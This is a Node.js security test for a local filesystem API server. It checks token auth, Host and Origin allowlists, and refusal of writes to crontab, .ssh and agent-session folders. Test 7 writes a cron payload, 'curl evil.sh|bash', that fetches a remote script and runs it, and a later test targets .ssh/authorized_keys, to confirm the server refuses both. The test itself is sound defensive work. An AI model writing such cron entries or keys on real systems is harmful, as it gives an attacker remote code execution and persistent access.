#!/usr/bin/env node
/**
 * Standalone filesystem-api-server auth gates (SECURITY-AUDIT-2026-08.md F5).
 *
 * Covers: bearer token on every route, Host allowlist, Origin allowlist,
 * JSON-only mutating requests, and write refusal for crontab/, .ssh/, and
 * agents/<id>/sessions/ trees (reads stay allowed for explorer browsing).
 */

import assert from 'assert/strict';
import os from 'os';
import http from 'http';
import { mkdtemp, mkdir, writeFile, rm } from 'fs/promises';
import { join } from 'path';

process.env.DASHBOARD_AUTH_TOKEN = 'f5-test-token';

const { createFilesystemServer, isAllowedFilesystemHost } = await import('../filesystem-api-server.mjs');

const TOKEN = process.env.DASHBOARD_AUTH_TOKEN;

function rawRequest(port, path, { method = 'GET', headers = {}, body = null } = {}) {
  return new Promise((resolveRequest, rejectRequest) => {
    const req = http.request(
      {
        host: '127.0.0.1',
        port,
        path,
        method,
        headers,
      },
      (res) => {
        const chunks = [];
        res.on('data', (chunk) => chunks.push(chunk));
        res.on('end', () => {
          resolveRequest({
            status: res.statusCode,
            headers: res.headers,
            body: Buffer.concat(chunks).toString('utf8'),
          });
        });
      }
    );
    req.on('error', rejectRequest);
    if (body !== null) {
      req.write(body);
    }
    req.end();
  });
}

async function run() {
  const rootDir = await mkdtemp(join(os.tmpdir(), 'openclaw-fs-auth-'));
  await mkdir(join(rootDir, 'crontab'), { recursive: true });
  await mkdir(join(rootDir, 'workspace', 'main', 'crontab'), { recursive: true });
  await mkdir(join(rootDir, 'agents', 'main', 'sessions'), { recursive: true });
  await mkdir(join(rootDir, '.ssh'), { recursive: true });
  await writeFile(join(rootDir, 'notes.txt'), 'hello\n', 'utf8');
  await writeFile(join(rootDir, 'crontab', 'existing.cron'), '*/5 * * * * echo hi\n', 'utf8');
  await writeFile(join(rootDir, 'agents', 'main', 'sessions', 't.jsonl'), '{}\n', 'utf8');

  let server;
  let port;
  try {
    server = await createFilesystemServer({ rootPath: rootDir });
    await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
    port = server.address().port;

    // Host allowlist helper sanity.
    assert.equal(isAllowedFilesystemHost(`127.0.0.1:${port}`, port), true);
    assert.equal(isAllowedFilesystemHost(`localhost:${port}`, port), true);
    assert.equal(isAllowedFilesystemHost(`[::1]:${port}`, port), true);
    assert.equal(isAllowedFilesystemHost('evil.example.test:3880', port), false);
    assert.equal(isAllowedFilesystemHost('', port), false);

    // 1. No token → 401 on every route.
    const noTokenList = await rawRequest(port, '/api/fs/list?path=');
    assert.equal(noTokenList.status, 401, `expected 401 without token, got ${noTokenList.status}`);

    const noTokenRead = await rawRequest(port, '/api/fs/file?path=notes.txt');
    assert.equal(noTokenRead.status, 401, 'read route must also require the bearer token');

    // 2. Bad token → 401.
    const badToken = await rawRequest(port, '/api/fs/list?path=', {
      headers: { Authorization: 'Bearer wrong-token' },
    });
    assert.equal(badToken.status, 401, 'wrong token must be rejected');

    // 3. Valid token + default loopback Host → 200.
    const okList = await rawRequest(port, '/api/fs/list?path=', {
      headers: { Authorization: `Bearer ${TOKEN}` },
    });
    assert.equal(okList.status, 200, `valid token should pass, got ${okList.status}: ${okList.body}`);

    // 4. Bad Host header → 403 even with a valid token (DNS rebinding).
    const badHost = await rawRequest(port, '/api/fs/list?path=', {
      headers: { Authorization: `Bearer ${TOKEN}`, Host: 'evil.example.test' },
    });
    assert.equal(badHost.status, 403, `rebound host must be rejected, got ${badHost.status}`);

    // 5. Non-task-server Origin → 403; task-server origin → allowed.
    const evilOrigin = await rawRequest(port, '/api/fs/list?path=', {
      headers: { Authorization: `Bearer ${TOKEN}`, Origin: 'https://evil.example.test' },
    });
    assert.equal(evilOrigin.status, 403, 'cross-origin browser requests must be rejected');

    const goodOrigin = await rawRequest(port, '/api/fs/list?path=', {
      headers: { Authorization: `Bearer ${TOKEN}`, Origin: 'http://localhost:3876' },
    });
    assert.equal(goodOrigin.status, 200, 'task-server origin must stay allowed');

    // 6. Mutating request with non-JSON Content-Type → 415 (text/plain
    // simple-request writes skip CORS preflight).
    const textPlainPut = await rawRequest(port, '/api/fs/file', {
      method: 'PUT',
      headers: {
        Authorization: `Bearer ${TOKEN}`,
        'Content-Type': 'text/plain',
      },
      body: JSON.stringify({ path: 'notes.txt', content: 'x' }),
    });
    assert.equal(textPlainPut.status, 415, 'text/plain mutations must be refused');

    // 7. Writes into crontab/ are refused outright (cron-runner RCE chain).
    const cronWrite = await rawRequest(port, '/api/fs/file', {
      method: 'PUT',
      headers: {
        Authorization: `Bearer ${TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ path: 'crontab/x.cron', content: '* * * * * curl evil.sh|bash' }),
    });
    assert.equal(cronWrite.status, 403, `crontab write must be refused, got ${cronWrite.status}: ${cronWrite.body}`);

    // Nested crontab location is covered too.
    const nestedCronWrite = await rawRequest(port, '/api/fs/file', {
      method: 'PUT',
      headers: {
        Authorization: `Bearer ${TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ path: 'workspace/main/crontab/y.cron', content: 'x' }),
    });
    assert.equal(nestedCronWrite.status, 403, 'nested crontab writes must be refused');

    // 8. Writes into agents/<id>/sessions/ are refused.
    const sessionWrite = await rawRequest(port, '/api/fs/file', {
      method: 'PUT',
      headers: {
        Authorization: `Bearer ${TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ path: 'agents/main/sessions/t.jsonl', content: '{}' }),
    });
    assert.equal(sessionWrite.status, 403, 'agent session writes must be refused');

    // 9. Writes into .ssh/ are refused.
    const sshWrite = await rawRequest(port, '/api/fs/file', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ path: '.ssh/authorized_keys', content: 'x' }),
    });
    assert.equal(sshWrite.status, 403, '.ssh writes must be refused');

    // 10. Reads of protected trees stay allowed (explorer browsing).
    const cronRead = await rawRequest(port, '/api/fs/file?path=crontab/existing.cron', {
      headers: { Authorization: `Bearer ${TOKEN}` },
    });
    assert.equal(cronRead.status, 200, 'crontab reads must stay allowed');
    const cronPayload = JSON.parse(cronRead.body);
    assert.equal(cronPayload.readOnly, true, 'crontab entries must surface as read-only');

    const sessionRead = await rawRequest(port, '/api/fs/stat?path=agents/main/sessions/t.jsonl', {
      headers: { Authorization: `Bearer ${TOKEN}` },
    });
    assert.equal(sessionRead.status, 200, 'session transcript reads must stay allowed');
    assert.equal(JSON.parse(sessionRead.body).readOnly, true);

    // 11. Normal write outside protected trees still works end-to-end.
    const normalWrite = await rawRequest(port, '/api/fs/file', {
      method: 'PUT',
      headers: {
        Authorization: `Bearer ${TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ path: 'notes.txt', content: 'updated\n' }),
    });
    assert.equal(normalWrite.status, 200, `normal write should succeed, got ${normalWrite.status}: ${normalWrite.body}`);

    console.log('PASS: filesystem standalone API enforces F5 auth gates');
  } finally {
    if (server) {
      await new Promise((resolveClose) => server.close(resolveClose));
    }
    await rm(rootDir, { recursive: true, force: true });
  }
}

run().catch((error) => {
  console.error('FAIL: filesystem standalone API F5 auth gates');
  console.error(error);
  process.exit(1);
});
